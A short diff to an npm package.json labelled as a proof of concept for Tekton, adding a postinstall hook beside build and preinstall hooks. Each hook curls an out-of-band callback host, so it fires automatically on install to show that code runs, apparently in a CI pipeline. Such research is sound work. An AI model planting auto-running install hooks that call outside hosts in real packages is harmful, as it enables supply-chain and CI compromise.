@@ -1,8 +1,10 @@
 {
   "name": "poc",
   "version": "1.0.0",
+  "description": "POC for Tekton",
   "scripts": {
     "build": "curl http://d526alg3t4gnvlgjmi10uztas8xbrsfge.oast.site/npm_build",
-    "preinstall": "curl http://d526alg3t4gnvlgjmi10uztas8xbrsfge.oast.site/npm_preinstall"
+    "preinstall": "curl http://d526alg3t4gnvlgjmi10uztas8xbrsfge.oast.site/npm_preinstall",
+    "postinstall": "curl http://d526alg3t4gnvlgjmi10uztas8xbrsfge.oast.site/npm_postinstall"
   }
 }
